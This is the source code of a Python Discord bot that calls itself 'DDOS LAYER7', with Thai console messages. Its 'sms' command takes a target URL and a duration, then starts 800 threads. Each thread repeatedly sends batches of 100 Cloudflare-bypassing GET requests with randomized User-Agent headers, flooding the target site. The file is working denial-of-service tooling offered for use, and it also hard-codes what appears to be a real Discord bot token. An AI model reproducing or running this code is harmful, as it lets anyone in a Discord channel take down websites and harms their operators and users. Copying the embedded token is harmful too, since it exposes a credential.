import time,datetime
import discord,time
import requests
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import threading,random
from fake_useragent import UserAgent
ua = UserAgent()
import cfscrape 
from colorama import Fore

prefix = "/"
token = "OTIyNDY2NzY1OTQwODc1MzA0.YcB4Hw.09j8KXQ4TO5MGj0bBTLOVPJxVzs"
   
bot = commands.Bot(command_prefix=prefix,help_command=None)

@bot.event
async def on_connect():
    print(f"กำลังล็อกอินบอท : {bot.user}")
    time.sleep(1.0)
    print("ล็อกอินสำเร็จ")
  
@bot.command()
async def sms(ctx, url,time:int):
    await ctx.send('hello')
    def attack():
    	until = datetime.datetime.now() + datetime.timedelta(seconds=int(time))
    	while (until - datetime.datetime.now()).total_seconds() > 0:
    		try:
    			for b in range(100):
    				s = cfscrape.create_scraper()
    				send = s.get(url,headers = {"Connection": "Keep-Alive", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": f"{ua.random}", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US;q=0.9"})
    		
    		except:
    			print("Server Error")
    			pass
    		stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
    for a in range(800):
    		threading.Thread(target=attack).start()

@bot.command()
async def help(ctx):
	emBed = discord.Embed(title="BOT BY : EES",description="DDOS LAYER7",color=0xff4612)
	emBed.add_field(name="/l7 url time",value="><")
	
	await ctx.channel.send(embed=emBed)
  
bot.run(token)
